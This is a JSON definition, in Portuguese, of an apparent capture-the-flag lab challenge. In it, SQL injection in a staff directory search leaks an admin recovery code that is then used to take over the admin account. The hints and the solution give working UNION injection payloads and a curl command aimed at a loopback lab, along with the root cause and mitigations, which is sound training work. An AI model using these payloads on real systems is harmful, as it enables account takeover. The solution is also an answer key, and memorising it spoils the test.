@@ -1,0 +1,81 @@
+{
+  "slug": "chain-sqli-to-admin",
+  "title": "Uma aspa basta",
+  "codename": "ATLAS DIRECTORY",
+  "summary": "O diretório da equipe compartilha um banco de dados com o console de admin. Um UNION na busca de login vaza o código de recuperação do admin, e o formulário de recuperação confia nele sem vinculá-lo a um usuário.",
+  "category": "chain",
+  "difficulty": "insane",
+  "kind": "challenge",
+  "lab_dir": "chain-sqli-to-admin",
+  "estimated_minutes": 35,
+  "xp": 580,
+  "tech": [
+    "Flask",
+    "SQLite",
+    "Sessions"
+  ],
+  "tags": [
+    "chaining",
+    "sql-injection",
+    "union",
+    "password-reset",
+    "insane"
+  ],
+  "story": "O Atlas fundiu seu diretório da equipe e seu console de admin em um único serviço com um único banco de dados. A busca do diretório foi escrita antes da fusão. O fluxo de recuperação foi escrito depois, por outro time, e armazena códigos em uma tabela que o diretório consegue ler.",
+  "objective": "Use SQL injection baseada em UNION na busca do diretório para recuperar o código de recuperação do admin, resgate-o em `/recovery` e leia a flag do console de admin.",
+  "rules": "Fique na origem loopback atribuída. O banco de dados é um arquivo SQLite descartável do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do console de admin",
+      "flag_type": "api",
+      "points": 580,
+      "required": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "A busca é concatenada",
+      "body": "`GET /directory?q=` retorna nomes correspondentes. Ela monta o SQL com o termo entre aspas. Tente `x' OR '1'='1` para ver a lista completa e confirmar a injeção.",
+      "cost": 40
+    },
+    {
+      "level": 2,
+      "title": "Encontre a tabela de recuperação",
+      "body": "A query retorna três colunas (id, name, role). Os códigos de recuperação ficam em `recovery_codes(username, code)`. Faça um UNION selecionando `recovery_codes.code` para que ele apareça na coluna role.",
+      "cost": 50
+    },
+    {
+      "level": 3,
+      "title": "Resgate-o",
+      "body": "Use `x' UNION SELECT 0,'Atlas','` depois `recovery_codes.code` e então ` FROM recovery_codes WHERE username='admin' -- `. Envie POST para `/recovery` com `username=admin&code=<code>&password=<12+ chars>`, faça login como admin e abra `/admin`.",
+      "cost": 55
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. `GET /directory?q=' UNION SELECT 0,'recovery','code FROM recovery_codes -- ` (URL-encoded). A tabela de resultados expõe o código de recuperação do admin na coluna role.\n2. `POST /recovery` com `username=admin`, esse código e uma nova senha.\n3. Faça login como admin e leia `/admin`.\n\n```bash\ncurl 'http://127.0.0.1:PORT/directory' --get --data-urlencode \"q=' UNION SELECT 0,'recovery',code FROM recovery_codes -- \"\n```",
+    "root_cause": "Uma query SQL concatenada cruza a trust boundary entre o diretório e o serviço de recuperação porque ambos compartilham um banco de dados. O código de recuperação é um segredo bearer sem vínculo com o usuário nem garantia de uso único, então o vazamento é imediatamente útil.",
+    "mitigation": "Parametrize a query do diretório; isole a tabela de recuperação em seu próprio schema e credenciais; vincule códigos de recuperação a um usuário com expiração e semântica de uso único; exija reautenticação para recuperação de admin."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — SQL injection UNION attacks",
+      "url": "https://portswigger.net/web-security/sql-injection/union-attacks",
+      "source_type": "official",
+      "description": "Extração de dados de outras tabelas por meio de UNION."
+    },
+    {
+      "title": "OWASP — SQL Injection Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Queries parametrizadas e isolamento."
+    },
+    {
+      "title": "CWE-89 — SQL Injection",
+      "url": "https://cwe.mitre.org/data/definitions/89.html",
+      "source_type": "standard",
+      "description": "Neutralização inadequada de sintaxe SQL."
+    }
+  ]
+}
